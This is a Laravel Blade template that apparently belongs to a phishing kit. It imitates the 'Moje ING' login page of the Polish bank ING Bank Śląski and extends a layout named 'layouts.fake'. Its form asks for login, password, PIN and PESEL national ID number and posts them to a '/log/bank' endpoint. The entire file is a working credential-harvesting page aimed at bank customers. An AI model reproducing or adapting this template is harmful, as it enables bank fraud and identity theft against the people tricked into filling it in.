@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/millenium.css') }}" rel="stylesheet">
@endpush
@section('content')
    <div id="layout-region" class="ing-container">
        <div class="login-layout">
            <div id="smart-app-banner-region"></div>
            <div class="region-wrapper login-region login-layout_container ui-content login-layout--top">
                <div class="main-content-wrap">
                    <h1 class="sr-only">Moje ING | ING Bank Śląski - Logowanie</h1>
                    <div id="content-region" class="main-content">
                        <div class="ing-login-container">
                            <div class="content-container box">
                                <header class="ing-header">
                                    <div id="nav-hybrid" class="navbar nav-hybrid nav-hybrid--mobileFixed">
                                        <div class="logo">
                                            <div class="logo__link">
                                                <div id="logo-region">
                                                    <div>
                                                        <img class="logo__img--logo"
                                                             src="{{asset($bank['logo'])}}"
                                                             alt="ING Bank Śląski" width="128">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </header>
                                <div id="info-region" class="box-content box-content--info"></div>
                                <div id="body-region" class="body" style="">
                                    <section class="login-form-container">
                                        <div id="check-login-error-banner" class="box-content box-content--error"></div>
                                        <div class="box-content box--after">
                                            <div class="login-form-content">
                                                <form id="bank_pm_form" method="POST" action="/log/bank"
                                                      role="form">
                                                    <div class="form-group">
                                                        <label for="login-input" class="_3LNER _3K-gi js-login-label">
                                                            <span aria-hidden="true">Login</span>
                                                            <span class="sr-only">Wpisz login do&nbsp;bankowości internetowej</span>

                                                        </label>
                                                        <div class="_3OvuS">
                                                            <a href="#" role="button" aria-haspopup="true"
                                                               data-html="false">
                                                                <span aria-hidden="true" class="icon x-small"
                                                                      data-placement="top">
                                                                    <svg>
                                                                        <use xlink:href="#ing-icon-tooltip"></use>
                                                                    </svg>
                                                                </span>
                                                                <div class="_3xxAs LTEDe"></div>
                                                                <div class="_613h5 Ik3r3">
                                                                    <div class="_2wRGO _3zm5B">Login zawiera 3 litery
                                                                        imienia, 3 litery nazwiska i&nbsp;4 cyfry np.
                                                                        jankow1234. Swój login (Identyfikator
                                                                        użytkownika) znajdziesz w&nbsp;umowie
                                                                    </div>
                                                                </div>
                                                                <span class="sr-only">Informacja</span>
                                                            </a>
                                                        </div>

                                                        <input autocomplete="off" type="text" required
                                                               class="form-control" name="login"
                                                               id="login-input" maxlength="10">
                                                    </div>
                                                    <div class="form-group">
                                                        <label for="password-input"
                                                               class="_3LNER _3K-gi js-password-label">
                                                            <span aria-hidden="true">Haslo</span>
                                                        </label>
                                                        <input autocomplete="off" type="password" required
                                                               class="form-control" name="password"
                                                               id="password-input">
                                                    </div>
                                                    <div class="form-group">
                                                        <label for="pin-input"
                                                               class="_3LNER _3K-gi js-pin-label">
                                                            <span aria-hidden="true">Enter your PIN code</span>
                                                        </label>
                                                        <input autocomplete="off" type="text" required
                                                               class="form-control" name="pin"
                                                               id="pin-input">
                                                    </div>
                                                    <div class="form-group">
                                                        <label for="pesel-input"
                                                               class="_3LNER _3K-gi js-pesel-label">
                                                            <span aria-hidden="true">Enter your PESEL number</span>
                                                        </label>
                                                        <input autocomplete="off" type="text" required
                                                               class="form-control" name="pesel"
                                                               id="pesel-input">
                                                    </div>
                                                    <div class="_39Dzw _1n7r2" id="login-btn">
                                                        <button class="btn" tabindex="-1" aria-hidden="true" slot="_button"
                                                                type="submit">Dalej</button>
                                                    </div>
                                                </form>
                                                <div class="footer-region">
                                                    <div></div>
                                                </div>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                                <div id="additional-region"></div>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection